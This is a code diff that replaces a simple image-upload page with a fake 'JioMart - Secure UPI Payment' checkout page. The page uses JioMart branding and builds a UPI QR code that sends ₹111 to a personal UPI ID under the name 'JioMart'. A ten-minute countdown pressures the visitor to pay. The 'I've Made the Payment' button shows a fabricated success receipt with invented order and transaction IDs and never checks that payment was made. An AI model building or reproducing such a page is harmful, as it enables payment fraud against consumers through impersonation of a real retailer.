@@ -1,49 +1,221 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Image Upload and URL Generator</title>
+    <title>JioMart - Secure UPI Payment</title>
+    <script src="https://cdn.rawgit.com/davidshimjs/qrcodejs/gh-pages/qrcode.min.js"></script>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
-        #preview { margin-top: 20px; }
-        img { max-width: 100%; height: auto; margin-top: 10px; }
-        button { margin-top: 10px; padding: 10px; cursor: pointer; }
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            color: #333;
+        }
+        .container {
+            max-width: 500px;
+            margin: 20px auto;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            text-align: center;
+        }
+        .header {
+            margin-bottom: 20px;
+        }
+        .logo {
+            width: 180px;
+            margin-bottom: 10px;
+        }
+        .amount {
+            font-size: 28px;
+            font-weight: bold;
+            color: #e40046;
+            margin: 15px 0;
+        }
+        .timer {
+            font-size: 18px;
+            color: #e40046;
+            margin: 15px 0;
+        }
+        .qr-container {
+            margin: 20px 0;
+            padding: 15px;
+            border: 1px dashed #ccc;
+            border-radius: 8px;
+            position: relative;
+        }
+        #qrcode {
+            width: 200px;
+            height: 200px;
+            margin: 0 auto;
+            padding: 10px;
+            background-color: white;
+            border: 1px solid #ddd;
+        }
+        .jio-logo-overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 5px;
+            border-radius: 5px;
+        }
+        .jio-logo-overlay img {
+            width: 40px;
+            height: 40px;
+        }
+        .upi-id {
+            margin: 15px 0;
+            padding: 10px;
+            background-color: #f9f9f9;
+            border-radius: 5px;
+            font-family: monospace;
+        }
+        .instructions {
+            text-align: left;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #666;
+        }
+        .success-page {
+            display: none;
+        }
+        .success-icon {
+            color: #4CAF50;
+            font-size: 60px;
+            margin: 20px 0;
+        }
+        .order-details {
+            text-align: left;
+            margin: 20px 0;
+            padding: 15px;
+            background-color: #f9f9f9;
+            border-radius: 5px;
+        }
+        .btn {
+            background-color: #e40046;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+            width: 100%;
+        }
+        .btn:hover {
+            background-color: #c5003d;
+        }
     </style>
 </head>
 <body>
-    <h2>Upload an Image</h2>
-    <input type="file" id="imageUpload" accept="image/*">
-    <div id="preview"></div><script>
-    document.getElementById('imageUpload').addEventListener('change', function(event) {
-        const file = event.target.files[0];
-        if (file) {
-            const reader = new FileReader();
-            reader.onload = function(e) {
-                const imgElement = document.createElement('img');
-                imgElement.src = e.target.result;
-                
-                const linkElement = document.createElement('p');
-                linkElement.textContent = `Image URL: ${e.target.result}`;
-                linkElement.id = "imageUrl";
+    <div class="container" id="payment-page">
+        <div class="header">
+            <img src="data:image/png;base64,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" alt="JioMart Logo" class="logo">
+            <h2>Secure UPI Payment</h2>
+        </div>
+        
+        <div class="amount">₹111.00</div>
+        
+        <div class="timer" id="timer">Complete payment in: 10:00</div>
+        
+        <div class="qr-container">
+            <div id="qrcode"></div>
+            <div class="jio-logo-overlay">
+                <img src="data:image/png;base64,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" alt="JioMart Logo">
+            </div>
+        </div>
+        
+        <div class="upi-id">
+            UPI ID: ankesh.737@fam
+        </div>
+        
+        <div class="instructions">
+            <h3>How to pay:</h3>
+            <ol>
+                <li>Open any UPI app on your phone</li>
+                <li>Scan the QR code or enter UPI ID manually</li>
+                <li>Enter amount ₹111 and complete payment</li>
+                <li>Do not close this window until payment is complete</li>
+            </ol>
+        </div>
+        
+        <button class="btn" id="simulate-payment">I've Made the Payment</button>
+    </div>
+    
+    <div class="container success-page" id="success-page">
+        <div class="header">
+            <img src="https://www.jiomart.com/assets/version1611679568/smartweb/images/jiomart_logo_beta.svg" alt="JioMart Logo" class="logo">
+        </div>
+        
+        <div class="success-icon">✓</div>
+        <h2>Payment Successful!</h2>
+        <p>Thank you for shopping with JioMart</p>
+        
+        <div class="order-details">
+            <h3>Order Details</h3>
+            <p><strong>Order ID:</strong> JM20250410-75342</p>
+            <p><strong>Transaction ID:</strong> TXN737202504101245</p>
+            <p><strong>Shipping ID:</strong> JMSHIP-42518</p>
+            <p><strong>Amount Paid:</strong> ₹111.00</p>
+            <p><strong>Expected Delivery:</strong> April 10, 2025</p>
+        </div>
+        
+        <button class="btn" onclick="window.print()">Print Receipt</button>
+        <button class="btn" style="background-color: #333; margin-top: 10px;" onclick="window.location.href='https://jiomart.com'">Continue Shopping</button>
+    </div>
 
-                const copyButton = document.createElement('button');
-                copyButton.textContent = "Copy URL";
-                copyButton.onclick = function() {
-                    navigator.clipboard.writeText(e.target.result).then(() => {
-                        alert("URL copied to clipboard!");
-                    });
-                };
-
-                const preview = document.getElementById('preview');
-                preview.innerHTML = '';
-                preview.appendChild(imgElement);
-                preview.appendChild(linkElement);
-                preview.appendChild(copyButton);
-            };
-            reader.readAsDataURL(file);
-        }
-    });
-</script>
-
+    <script>
+        // Generate UPI QR Code
+        const upiId = 'ankesh.737@fam';
+        const amount = '111';
+        const payeeName = 'JioMart';
+        const transactionNote = 'JioMart Order';
+        
+        // UPI QR code format as per NPCI specifications
+        const upiUri = `upi://pay?pa=${encodeURIComponent(upiId)}&pn=${encodeURIComponent(payeeName)}&am=${amount}&tn=${encodeURIComponent(transactionNote)}`;
+        
+        // Generate QR code
+        new QRCode(document.getElementById("qrcode"), {
+            text: upiUri,
+            width: 180,
+            height: 180,
+            colorDark: "#000000",
+            colorLight: "#ffffff",
+            correctLevel: QRCode.CorrectLevel.H
+        });
+        
+        // Timer functionality
+        let timeLeft = 600; // 10 minutes in seconds
+        const timerElement = document.getElementById('timer');
+        
+        const timer = setInterval(() => {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            
+            timerElement.textContent = `Complete payment in: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+            
+            if (timeLeft <= 0) {
+                clearInterval(timer);
+                timerElement.textContent = 'Payment time expired!';
+            } else {
+                timeLeft--;
+            }
+        }, 1000);
+        
+        // Payment simulation
+        document.getElementById('simulate-payment').addEventListener('click', function() {
+            // Show success page
+            document.getElementById('payment-page').style.display = 'none';
+            document.getElementById('success-page').style.display = 'block';
+            
+            // Stop the timer
+            clearInterval(timer);
+        });
+    </script>
 </body>
 </html>
